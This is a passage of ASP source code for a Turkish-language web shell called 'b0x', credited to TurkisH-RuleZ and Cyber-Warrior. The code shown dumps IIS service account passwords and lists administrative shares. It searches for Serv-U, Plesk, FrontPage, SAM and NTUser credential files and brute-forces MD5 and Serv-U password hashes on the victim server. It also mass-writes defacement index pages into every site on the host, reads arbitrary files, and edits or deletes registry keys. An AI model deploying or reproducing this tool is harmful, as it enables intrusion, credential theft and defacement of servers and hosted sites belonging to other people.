yazsol("IP : <font color=#C6FCBE>"&request.servervariables("LOCAL_ADDR")&"</font>")
yazsol("HTTPD : <font color=#C6FCBE>"&request.servervariables("SERVER_SOFTWARE")&"</font>")
yazsol("WebRoot : <font color=#C6FCBE>"&request.servervariables("APPL_PHYSICAL_PATH")&"</font>")
yazsol("LogRoot : <font color=#C6FCBE>"&request.servervariables("APPL_MD_PATH")&"</font>")
yazsol("Zaman : <font color=#C6FCBE>"&date()&" - "&time()&"</font>")
yazsol("HTTPs : <font color=#C6FCBE>"&request.servervariables("HTTPS")&"</font>")
response.write "</td><td width='350'>"
yazorta("<b>Server?n Senden Alg?lad?klar?</b>")
yazsol("IP : <font color=#C6FCBE>"&request.servervariables("REMOTE_ADDR")&"</font>")
yazsol("Proxy IP : <font color=#C6FCBE>"&request.servervariables("HTTP_X_FORWARDED_FOR")&"</font>")
yazsol("User Agent : <font color=#C6FCBE>"&request.servervariables("HTTP_USER_AGENT")&"</font>")
yazsol("Interface : <font color=#C6FCBE>"&request.servervariables("GATEWAY_INTERFACE")&"</font>")
yazsol("Protocol : <font color=#C6FCBE>"&request.servervariables("SERVER_PROTOCOL")&"</font>")
yazsol("Method : <font color=#C6FCBE>"&request.servervariables("REQUEST_METHOD")&"</font>")
yazsol("Via : <font color=#C6FCBE>"&request.servervariables("HTTP_VIA")&"</font>")
yazsol("Cache Control : <font color=#C6FCBE>"&request.servervariables("HTTP_CACHE_CONTROL")&"</font>")
response.write "</td></tr></table></center>"
on error resume next
Set IIsObject = GetObject ("IIS://localhost/w3svc")
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td colspan=2>"
yazorta("<b>IIS Bilgileri</b>")
response.write "</td></tr><tr><td width='50%'>"
yazsol("AnonymousUserName : <font color=#C6FCBE>"&IIsObject.Get("AnonymousUserName")&"</font>")
yazsol("AnonymousUserPass : <font color=#C6FCBE>"&IIsObject.Get("AnonymousUserPass")&"</font>")
response.write "</td><td width='50%'>"
yazsol("WAMUserName : <font color=#C6FCBE>"&IIsObject.Get("WAMUserName")&"</font>")
yazsol("WAMUserPass : <font color=#C6FCBE>"&IIsObject.Get("WAMUserPass")&"</font>")
Set IIsObject = Nothing
response.write "</td></tr><tr><td colspan=2>"
yazorta("<a href='"&FilePath&"?mode=38&Path="&Path&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">..:: Aç?klama ?çin T?klay?n?z.. by b0x  ::..</a>")
response.write "</td></tr></table></center>"
strServer = b0xNet.ComputerName
set objFs = GetObject("WinNT://" _
& strServer & "/LanmanServer,FileService")
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td width=260>"
yazorta(" <b>Server' in Payla??ma Aç?k Klas?rleri by b0x </b>")
yazsol("<a href='"&FilePath&"?Path=//"&strServer&"/C$'>\\"&strServer&"\C$</a>")
yazsol("<a href='"&FilePath&"?Path=//"&strServer&"/Admin$'>\\"&strServer&"\Admin$</a>")
For Each objShare In objFs
yazsol("<a href='"&FilePath&"?Path=//"&strServer&"/"&objShare.name&"'>\\"&strServer&"\"&objShare.name&"</a>")
Next
response.write "</td></tr></table></center>"

response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Uzakdan Serv-U & GeneFtp & UsersTxT Eri?imi SOnucu  by b0x </b>")
b0xServuRemote()
yazorta("<b>Geli?mi? Arama için</b>")
yazorta("<a href='"&FilePath&"?Path=C:\Program Files\&hacked=serv&Time="&time&"&mode=23'>Serv_U</a> - <a href='"&FilePath&"?Path=C:\Program Files\&hacked=Daemon&Time="&time&"&mode=23'>Daemon</a> - <a href='"&FilePath&"?Path=C:\&hacked=ws_ftp&Time="&time&"&mode=23'>Ws_Ftp</a> - <a href='"&FilePath&"?Path=C:\&hacked=base.ini&Time="&time&"&mode=23'>Base.ini</a> - <a href='"&FilePath&"?Path=C:\Program Files\&hacked=remote.ini&Time="&time&"&mode=23'>Remote.ini</a>")
response.write "</td></tr></table></center>"

response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Uzakdan PLESK Eri?imi SOnucu by b0x </b>")
b0xPleskRemote()
response.write "</td></tr></table></center>"

On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Vti_Pvt/Access.Cnf & Postinfo & ServicePwd Sonucu by b0x</b>")
b0xVti_Pvt()
yazorta("<b>Geli?mi? Arama için</b>")
local = request.servervariables("APPL_PHYSICAL_PATH")
yazorta("<a href='"&FilePath&"?Path="&local&"\..\..\&hacked=access.cnf&Time="&time&"&mode=23'>access.cnf</a> - <a href='"&FilePath&"?Path="&local&"\..\..\&hacked=postinfo&Time="&time&"&mode=23'>postinfo</a> - <a href='"&FilePath&"?Path="&local&"\..\..\&hacked=service.pwd&Time="&time&"&mode=23'>service</a>")
response.write "</td></tr></table></center>"

On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> NTUser.Dat - Log - ?ni Eri?im Sonucu by b0x </b>")
b0xaNTUser(struser)
response.write "</td></tr></table></center>"

On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Config Klas?r Eri?im Sonucu by b0x</b>")
b0xsam()
response.write "</td></tr></table></center>"
Call Status 


On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Repair Klas?r Eri?im Sonucu by b0x</b>")
b0xRepair()
response.write "</td></tr></table></center>"
Call Status 

nolist = True

CASE 38 ' IIS bilgi Alan? by b0x
yazsol("W?ndows Server lardaki, himeti sunan, IIS servisi, sizi AnonymousUserName ve o ?ifre ile tan?r. Sizin yetkiniz o kullan?c?dad?r. ")
yazsoll("IIS içinde ise, o siteninde BEllekdeki Oturum ad?da -> WAMUserName ad?nda ve ?ifresine sahiptir.")
yazsoll("Bu Sistem Geli?tirilmeye Devam ediyor? ")

CASE 39 ' Seçmece bunlar MD5- servu =) by b0x
response.write "<br><br><br><br><br><center><table width='100%' bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td><form action='"&FilePath&"?mode=40' method=post>"
yazorta("<b> K?rmak ?stedi?in Türü Seç</b>")
yazorta("<input name='islem' style='color=#C6FCBE' value=' ..::  MD5  ::.. ' type='Submit'> <input name='islem' style='color=#C6FCBE' value=' ..::  Serv-U  ::.. ' type='Submit'>")
response.write "</form></td></tr></table></center>"
yazsol("<b>MD5 :</b> Bildi?iniz üzere, bir çok sistemin kulland??? bir ?ifreleme olay?d?r. 128 bittir.")
yazsol("<b>Serv-U :</b> Server larda Host lar?n kulland??? bir programd?r. Kolay vede kullan??l? oldu?u için Hostlar taraf?ndna tercih edilir. içinde Ftp ?ifreleri bar?nd?rmakdad?r. burdada o ?ifreleri k?rmaktad?r.")
yazsoll("<font color=#C6FCBE >Bizde burda ASP tabanl? vede b0x içine injecte edip Sizlere Server ?n CPU ve RAM ini kullanarak , Daha h?zl? ve zahmetsiz, T?meOUT suz bir ?ekilde ?ifreleirni k?rman?z? sa?layaca??z. Bu K?rma i?lemi BRUTE attackl modelidir. K?sacas? K?rma olas??? e?er ki sabreder ve ?ans?n?z varsa çok k?sa sürede k?rars?n?z. Ama aksi halde 1 gün geçsede =) yinede %100 k?rm?a garantisi vard?r. E?er derleri do?ru girerseniz.</font>")
yazortaa("Md5 & Serv-U KOd Converted by <b>Fastboy</b>")
Yazorta("Brute And HJACk Algorithms Written by <b>b0x</b>")

CASE 40 ' Md5 & Serv-U Algortitmas? Ba?l?yor S?k? tutnun =) sak?n duda??n?z uçuklama?sn haa =) by b0x euheuh çok yordu be kafam? bu olay .. neyse ç?zdük yine =) eeheuh by b0x
response.write "<center><table width='100%' bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td><form action='"&FilePath&"?mode=41' method=post>"
if islem = " ..::  MD5  ::.. " then
yazorta("<b> __==  MD5 Cracker by b0x  ==__ </b>")
else
yazorta("<b> __==  Serv-U Cracker by b0x  ==__ </b>")
end if
if islem = " ..::  MD5  ::.. " then
yazsol("MD5 Kodu Girin 1 : <input style='color=#C6FCBE' size='54' name='Usersmd5' value='Hash kod u giriniz ç?zülecek olan.' type='text'>")
else
yazsol("Serv-u Ham Kodu Girin 1 : <input style='color=#C6FCBE' size='45' name='Usersmd5' value='Hash kod u giriniz ç?zülecek olan.' type='text'>")
yazsol("Salt Kodu : <input style='color=#C6FCBE' size='30' name='salt' value='ww' type='text'>")
end if
response.cookies("mdd") = ""
response.cookies("hash1") = ""
response.cookies("hash2") = ""
response.cookies("hash3") = ""
response.cookies("hash4") = ""
response.cookies("hash5") = ""
response.cookies("hash6") = ""
response.cookies("hash7") = ""
response.cookies("hash8") = ""
response.cookies("hash9") = ""
response.cookies("hash10") = ""
yazsol("Hash 2 : <input style='color=#C6FCBE' size='54' name='hash2' value='' type='text'>")
yazsol("Hash 3 : <input style='color=#C6FCBE' size='54' name='hash3' value='' type='text'>")
yazsol("Hash 4 : <input style='color=#C6FCBE' size='54' name='hash4' value='' type='text'>")
yazsol("Hash 5 : <input style='color=#C6FCBE' size='54' name='hash5' value='' type='text'>")
yazsol("Hash 6 : <input style='color=#C6FCBE' size='54' name='hash6' value='' type='text'>")
yazsol("Hash 7 : <input style='color=#C6FCBE' size='54' name='hash7' value='' type='text'>")
yazsol("Hash 8 : <input style='color=#C6FCBE' size='54' name='hash8' value='' type='text'>")
yazsol("Hash 9 : <input style='color=#C6FCBE' size='54' name='hash9' value='' type='text'>")
yazsol("Hash 10 : <input style='color=#C6FCBE' size='54' name='hash10' value='' type='text'>")
yazsol("?ifre Aral??? :  <input style='color=#C6FCBE' size='5' name='ara1' value='5' type='text'>  ile  <input style='color=#C6FCBE' size='5' name='ara2' value='18' type='text'> aras?nda...")
yazsol("Deneme Say?s? :  <input style='color=#C6FCBE' size='5' name='inject1' value='100' type='text'> (1 keredeki deneme say?s?)")
yazsoll("<b>CharSet i seçiniz;</b>")
yazsol("<input name='k1' value='k1' type='checkbox' checked > ABCDEFGHIJKLMNOPQRSTUVWXYZ")
yazsol("<input name='k2' value='k2' type='checkbox'  > abcdefghijklmnopqrstuvwxyz")
yazsol("<input name='k3' value='k3' type='checkbox' checked > 0123456789")
yazsol("<input name='k4' value='k4' type='checkbox'  > !@#$%^&*()-_+=~`[]{}|\:;<>,.?/")
yazsol("Bekleme Süresi : <input style='color=#C6FCBE' name='waiting' value='2' type='text' size='5'> saniye")
yazorta("<input name='mode' value='41' type='hidden'><input name='md5kirgecirmahvetb0x' style='color=#C6FCBE' value='  __==  K?rmaya Ba?la  ==__ ' type=submit>")
response.write "</td></tr></form></table></center>"
if islem = " ..::  MD5  ::.. " then
yazsol("<b>MD5 Kodu Girin :</b> MD5 HASh ?ifrenizi giriniz oraya.. maksimum 10 Hash girebilirsiniz.")
else
yazsol("<b>Serv-u Ham Kodu Girin :</b> Serv-u Kodunun ilk 2 karakteri SALT dur. egri kalan? ise MD5 halidir. Oraya ilk 2 karakteri ç?kar?n ve geri kalan? yaz?n. altasa da SALT k?sm?nada, ilk 2 karakteri yaz?n. Max 10 Hash girebilirsiniz.")
end if
yazsol("<b>?ifre Aral??? :</b> Burda belirtilen aral?klar aras?nda ?ifre üretip, denemeye ba?l?cakt?r. ?nce küçükden ba?lay?p, tüm charset denemsini yapt?kdan sonra, aral?k bir artacakt?r, taaki sizin üst s?n?ra kadar girdi?iniz.")
yazsol("<b>CharSet i seçiniz; </b> ?ifre denerkenki, ?ifre karakterleridir. Büyük küçük harf ?nemlidir. Birden FAzla da seçebilriisniz. Ama unutmay?nki, Deneme say?s? büyüdükçe, Zamanda ARTACAKTIR. ")
yazsol("<b>Bekleme Süresi :</b> Sürekli md5 deneme yaparsa sistem, büyük bir oranda Cpu kullan?r. Cpu kullan?m? rahatlatmak için vede timeout u ?nlemek için , her bir Charset uzunlu?u kadar deneyip, sonra yenileme yap?yor. o s?radaki bekleme süresidir bu.")
yazsol("<b>NOT :</b> Toplu Md5&ServU k?rmak mümkün. Hepsini birden kulland???n?zda verim artacakt?r. HIZ da dü?ü? olmaz. Ama sizin Daha kolay k?rman?z? sa?lar, Coklu k?rma.")

CASE 41 ' MD5 deneniyorrrrrr by b0x
' yerel de?i?kenelrim 
on error resume next
if request.cookies("mdd") = "0" or request.cookies("mdd") = ""  then
	session("say") = 1
	Call Cookyaz("hash1","has1",Usersmd5)
	Call Cookyaz("hash2","has2",hash2)
	Call Cookyaz("hash3","has3",hash3)
	Call Cookyaz("hash4","has4",hash4)
	Call Cookyaz("hash5","has5",hash5)
	Call Cookyaz("hash6","has6",hash6)
	Call Cookyaz("hash7","has7",hash7)
	Call Cookyaz("hash8","has8",hash8)
	Call Cookyaz("hash9","has9",hash9)
	Call Cookyaz("hash10","has10",hash10)
	inject4 = CInt(session("say"))
	inject3 = 0
end if

increment = 0
sifre = ""
hashing = ""
goup=0
getend=0

if inject4 = inject3 then
	response.write ("<script>alert(""Mükemmel Tüm ?ifreler K?r?ld? ;) by b0x "")</script>")
	response.end()
end if
	
if coding ="" then ' kod olu?tur
	coding = kodolustur(ara1)
end if

coding = replace(coding,"x","#")

if dizi = "" then ' Charset i olu?uturuyorum..
	dizi = diziolustur()
end if

Call HashFounded("hash1","has1")
Call HashFounded("hash2","has2")
Call HashFounded("hash3","has3")
Call HashFounded("hash4","has4")
Call HashFounded("hash5","has5")
Call HashFounded("hash6","has6")
Call HashFounded("hash7","has7")
Call HashFounded("hash8","has8")
Call HashFounded("hash9","has9")
Call HashFounded("hash10","has10")

for t=1 to inject1
sifre = Sifreyarat(coding,ara1,dizi)
if salt = "" then
	md5li=UCASE(md5(sifre))
	response.write sifre &" - "& md5li & "<br>"
else
	md5li=UCASE(md5(salt+sifre))
	response.write salt+sifre &" - "& md5li & "<br>"
end if

Call hashyes("hash1","has1",md5li,sifre)
Call hashyes("hash2","has2",md5li,sifre)
Call hashyes("hash3","has3",md5li,sifre)
Call hashyes("hash4","has4",md5li,sifre)
Call hashyes("hash5","has5",md5li,sifre)
Call hashyes("hash6","has6",md5li,sifre)
Call hashyes("hash7","has7",md5li,sifre)
Call hashyes("hash8","has8",md5li,sifre)
Call hashyes("hash9","has9",md5li,sifre)
Call hashyes("hash10","has10",md5li,sifre)

coding = SonrakiAdim(coding,ara1,dizi)
'response.flush
next
coding = replace(coding,"#","x")
if CInt(ara1) <> CInt(ara2)+1 then
response.write "<META http-equiv=refresh content="&waiting&";URL='"&FilePath&"?mode=41&ara1="&ara1&"&ara2="&ara2&"&dizi="&dizi&"&coding="&coding&"&waiting="&waiting&"&inject1="&inject1&"&salt="&salt&"&inject4="&inject4&"&inject3="&inject3&"'>"
end if
response.flush

CASE 42 'MSWC nesnesi kullan?m?. Permision geçme ad?na att???m bir adamd?r. bu nesnenin oldu?unu "Scorlex" den edindim. Ara?t?rd?m neler yapar?m diye =) i?te g?rün neler yap?labiliyormu?uz ;) bununla. uehueh by b0x
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<b>Hacking with Using MSWCTools 1.0 Developed By TurkisH-RuleZ</b>")
yazsol("<form action='"&FilePath&"?mode=43' method=post><b>?ndex Yeri : </b><input name='hash2' type='text' value='"&FilePath&"' size=50> (?ndexin Serverdaki virtual yeri)")
yazsol("<input type=radio name='hash4' checked value='tek'> <b>At?lacak Yer: </b><input name='hash3' type='text' value='default.asp' size=50> (Tek bir yere Yaz.)")
yazsol("<input type=radio name='hash4' value='multi'> <b>MASS Path: </b><input name='hash6' type='text' value='.\' size=50> (Mass yap?lacak dizin)")
yazsol("<b>Eklencek Klas?r: </b><input name='hash5' type='text' value='httpdocs\' size=25> (Ek Klas?r girdisi -  BO? b?rak?n , bilmiyorsan?z)")
yazorta("<input name='G?nder_Ej_De_r' value='Yazd?r koçumm ;) by b0x' type='submit'")
response.write "</td></tr></table></form>"
yazorta("<b>Kullan?m? by b0x</b>")
yazsol("?necelikle, b0x nesnesi kullanmadan bir dosyay? , istenilen yere MSWC nesnesi ile yazd?r?lanabiliniyor. b0x deste?i olmayan bir server da bile, rahatça bu nesne yard?m? ile index atabilirsiniz. Kimi serverlarda, permison engeline tak?l?r?z yada kls?rü içine giremeyiz, yada b0x kullan?m? k?s?tl?d?r. bunlar? A?MAK için bu nesneyi kulland?m. Bu nesne ?u an localhost ve 1-2 yerde çal??t? sa?l?kl? ?ekilde. ?u an TEst sürümünde diyebilirim. Umar?m bu bizim permison =) geçme yollumuzu ayd?nlat?r ne dersiniz :)) uehueh")
yazsol("<b>index yeri -></b>Buray? fiziksel yeri Writing YIN SAKIN. oraya indexinizin virtual yerini yani. Kulland???n?z b0x dizinine olan PathUNU yaz?n indexin yani. Bu b0x ile ayn? yerde ise, 'hacked.html' e?er alt klas?rde ise -> '..\hacking.html', '..\..\..\b0x\www\hacking.html',yada \news\hacking.html gibi belirtmeniz gerek.Pathunu b?yle belirlemeniz gerekiyor. 'C:\ss\ss\hacking.html' yapt???n?zda i?lem gerçekle?mezz.. <b>YADA size ?NER?m -> kulland???n?z b0x yu istedi?inzi yere server daki bir ba?kas siteye copyalat?rr?san?z , , bu sefer b0x yu o site üzeridnen çal??t?rr?rsan?z PErmsion ? a?m?? olursunuz o site için.</b>")
yazsol("<b>At?lacak yer ->></b> TEK bir hedef için. Buray?da ..\..\ ?eklinde inerek belirtmeniz gerekiyor.mesela '..\..\..\index.asp' 3 dizin a?a??ya iner ve index i atar yada '..\..\..\www\index.asp'  3 dizin iner ww dizine girer , index i atar. =) b?yle OLAMAK zorunda .  ")
yazsol("<b>MASS Path  ->></b> BUrda çoklu alt klas?rlerede index atmak için geli?tirdim. '..\..\..\' ?eklinde a?a??lara inin ve TUM sietelerin L?Stelendi?i klas?r ee kadar olan '..\' i?aretini ayarlay?n. mesela 3 dizin a?a??da ise b0x olan uzakl???, '..\..\..\'  yaz?n yeterdir =) . <b>Eklenecek klas?r-></b> burda da, TUm sietlere giri? yap?ld?kdan sonraki Klas?r ad? , mesela 'www' yada 'http' yada 'wwwroot'  gibi.")
yazsol("Neden b?yle derseniz, MSWC nin kullan?m?, destekleid?i ?ekil b?yledir. Biraz kafa kar??t?r?c?. Ama ben denedim g?rdüm =) memnun kald?m. O yüzden bu b0x da yerini ald?. ?undan eminimki kullan?m?n? deneyerek ??rendi?inizde, sizinde PErmsion geçmede vazgeçilmeziniz olacakd?r =) euheuh")
yazorta("Biraz zor oldu be  <b>b0x</b> for giving idea about MSWC Component")
yazorta("<b>Coding & Development & Algorithms Made by b0x</b>")

CASE 43 'MSWC i?leniyor =)
on error resume next
Set utils = Server.CreateObject("MSWC.Tools")
if err <> 0 then
	olmadi("MSWC.tools deste?i yoktur bu server?n.")
end if
if hash4 = "tek" then
	on error resume next
	utils.ProcessForm hash3, hash2
	if err <>0 then
		olmadi("Ba?ar?s?z. Belirti?iniz virtual path lar do?rumu emin olun. MSWC deste?i var çünkü server ?n.")
	else
		oldu("Ba?ard?n?z ;) i?lem gerçekle?tii.")
	end if
else 
on error resume next
Set f = b0x.GetFolder(FolderPath)
Set fc = f.SubFolders
if err<>0 then
	olmadi("bu klas?r e b0x nesnesi ile tarama yap?lam?yor. ?nce okunmal?, sonra MSWC devreye girer.")
end if
For Each f1 In fc
	on error resume next
	mevki = hash6+f1.name+"\"+hash5+"default.asp"
	utils.ProcessForm mevki, hash2
	mevki = hash6+f1.name+"\"+hash5+"index.asp"
	utils.ProcessForm mevki, hash2
	mevki = hash6+f1.name+"\"+hash5+"default.htm"
	utils.ProcessForm mevki, hash2
	mevki = hash6+f1.name+"\"+hash5+"index.html"
	utils.ProcessForm mevki, hash2
	mevki = hash6+f1.name+"\"+hash5+"b0x.html"
	utils.ProcessForm mevki, hash2		
	mevki = hash6+f1.name+"\"+hash5+"index.htm"
	utils.ProcessForm mevki, hash2	
	if err<>0 then
	response.write "<table width=""100%""><tr><td class=""kbrtm""> "& hash6+f1.name+"\"+hash5&" <font color=#FE7A84> Noo :( !! <font class=""k1"">û</font></td></tr></table>"
	else
	response.write "<table width=""100%""><tr><td class=""kbrtm""> "& hash6+f1.name+"\"+hash5&" <font color=#C6FCBE> OK !! <font class=""k1"">ü</font></td></tr></table>"
	end if
	response.flush
Next
yazorta("<b>??lem Tamamland?. Developed By TurkisH-RuleZ</b>")
end if

CASE 44 'XMLHTTP l? dosya Reading  .
if inject2 = "ok" then
mevki = hash2
else
mevki = Fullpath
end if
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<b>Reading Files by using XMLHTTP 1.0 Developed By TurkisH-RuleZ</b>")
yazsol("<form action='"&FilePath&"?mode=44' method=post><input name='inject2' value='ok' type='hidden'><b>File Path  : </b><input name='hash2' type='text' value='"&mevki&"' size=60><input name='goruntule_by_A_l_f_o' value='.: Go :.' type='submit'>")
response.write "</td></form></tr></table>"
if not inject2 = "ok" then
yazsol("Hint : This is Private a Private Tool For Reading Files On Windows IIS Server ... :) ")
yazsol("wWw.Sec-b0x.CoM")
else
response.write "<textarea style='width:100%;height:470;' >"
on error resume next
Set b0x = Server.CreateObject("Microsoft.XMLHTTP")
b0x.Open "GET", hash2, false
b0x.Send 
if err=0 then
Response.Write Server.HTMLEncode(b0x.ResponseText)
else
response.write "Yazd???n?z adres bulunamad? . ?? bir kontrol yap Developed By TurkisH-RuleZ"
end if
response.write "</textarea>"
end if
yazorta("<b>Developed By TurkisH-RuleZ</b>")

CASE 45 'Registiry Edit?r  =) by    A L F O N S O   F E E L    T H E    P O W E R   O F   T U R K S
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<b>REGISTRY EDITOR 2.0 Developed By TurkisH-RuleZ</b>")
tablo30("<br><b>REGister lara Writing  & Ekleme</b>")
yazsol("<form action='"&FilePath&"?mode=45' method=post><input name='inject2' value='yaz' type='hidden'><b>Mevki/Key : </b><input name='hash2' type='text' value='' size=85><br> (?rnek: HKLM\SOFTWARE\Microsoft\b0x.COM)")
yazsol("De?er/Value: <input name='hash3' value='' type='text'>")
yazsol("TUr/Type: <select name='hash4'><option value=1>REG_SZ</option><option value=2>REG_DWORD</option><option value=3>REG_BINARY</option><option value=4>REG_EXPAND_SZ</option><option value=5>REG_MULTI_SZ</option></select> &nbsp;&nbsp;&nbsp;&nbsp;  <input name='SaVSA_K_CoM' value='..:: YAZDIR ::..' type='Submit'>")
response.write "</td></form></tr></table>"
yazsol("<table><tr><td>Root Key Name</td><td>Kar??l???</td></tr><tr><td>HKEY_CURRENT_USER</td><td>HKCU</td></tr><tr><td>HKEY_LOCAL_MACHINE</td><td> HKLM </td></tr><tr><td>HKEY_CLASSES_ROOT</td><td>HKCR</td></tr><tr><td>HKEY_USERS</td><td>HKEY_USERS </td></tr><tr><td>HKEY_CURRENT_CONFIG</td><td>HKEY_CURRENT_CONFIG </td></tr></table>")
yazsol("REG_SZ -> String(kelime) / REG_DWORD -> ?nteger(Say?) / REG_BINARY -> Binary / REG_EXPAND_SZ -> Multi String / REG_MULTI_SZ -> Aeeay String")
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<br><b>Register lardan Reading   & S?L Coded Developed By TurkisH-RuleZ</b>")
yazsol("<form action='"&FilePath&"?mode=45' method=post><input name='inject2' value='oku' type='hidden'><b>Mevki/Key : </b><input name=""hash5"" type='text' value='' size=85><br> (?rnek: HKLM\SOFTWARE\Microsoft\b0x_WAS_HERE)")
yazorta("<input value='oku' name='hash6' type='radio' checked> OKU  -  <input value='sil' name='hash6' type='radio'> S?L &nbsp;&nbsp;&nbsp;&nbsp;  <input name='SaVSA_K_CoM_' value='..:: OKU/S?L ::..' type='Submit'>")
response.write "</td></form></tr></table>"
on error resume next
Set SaVSaK = Server.CreateObject("WScript.Shell")
	if err <> 0 then
		olmadi("Server da WScript.SHell kullan?m?na ?zin vermemektedir. ??lem ba?ar?s?z.")
		response.end()
	end if
if inject2 = "yaz" then
	on error resume next
	Select Case CInt(hash4)
		Case 1
			hash9 = SaVSaK.RegWrite (Trim(hash2), Trim(hash3), "REG_SZ")
		Case 2
			hash9 = SaVSaK.RegWrite (Trim(hash2), CInt(Trim(hash3)), "REG_DWORD")
		Case 3
			hash9 = SaVSaK.RegWrite (Trim(hash2), CInt(Trim(hash3)), "REG_BINARY")
		Case 4
			hash9 = SaVSaK.RegWrite (Trim(hash2), Trim(hash3), "REG_EXPAND_SZ")
		Case 5
			hash9 = SaVSaK.RegWrite (Trim(hash2), Trim(hash3), "REG_MULTI_SZ")
	End Select
	if err <> 0 then
		olmadi("??lem  gerçekle?tirilemedi. VALUE de?erinin do?ru ve uygun Value girid?inziden emin ol.")
	else
		oldu(" <b>"+hash2+"</b><br> adresine register yaz?ld?. ")
	end if

else if inject2 = "oku" then
	if hash6 = "oku" then
		yazorta("Mevki/Key: <b>"&Trim(hash5)&"</b>")
		on error resume next
		response.write "<center>De?er/Value: <b>"
		response.write SaVSaK.RegRead (Trim(hash5))
		response.write "</b></center>"
		if err<>0 then
			olmadi("Kay?t Register larda bulunamad?...")
		end if		
	else if hash6 = "sil" then
		yazorta("Mevki/Key: <b>"&Trim(hash5)&"</b>")
		on error resume next
		hash9 = SaVSaK.RegDelete (Trim(hash5))
		if err<>0 then
			olmadi("Registerlardan Silinemedi. KEy yanl?? olabilir. yada kay?t bulanamad?.")
		else
			oldu("Ba?ar?yla Silindi. ")
		end if
	end if 
	end if

end if
end if
yazortaa("<b>Coded by b0x - Cyber-Warrior</b>")


END SELECT


if popup = False AND nolist = False then
response.write "<br><br>"
response.write "<div  style=""z-index:150; position:absolute"">"
Call KlasorOku()
response.write "</div><div  align=""right"">"
Call DosyaOku()
response.write "</div>"
end if

if popup = False then
response.write "<br><br><center><table cellpadding=""0"" cellspacing=""0"" width=""160"">"
response.write "<tr><td class=""kbrtm"" height=""20"" style=""background-color:121212"" align=""center""><b>b0x Disk'z</b></td></tr>"
Call Suruculer
response.write "</table></center><br><br>"
Call SurucuInfo
yazortaa("<b>Coded by Alfso ... Developed By <a href=""mailto:z1d1337@Gmail.CoM""> TurkisH-RuleZ")
yazorta("<center>wWw.Sec-b0x.coM")
end if
%>
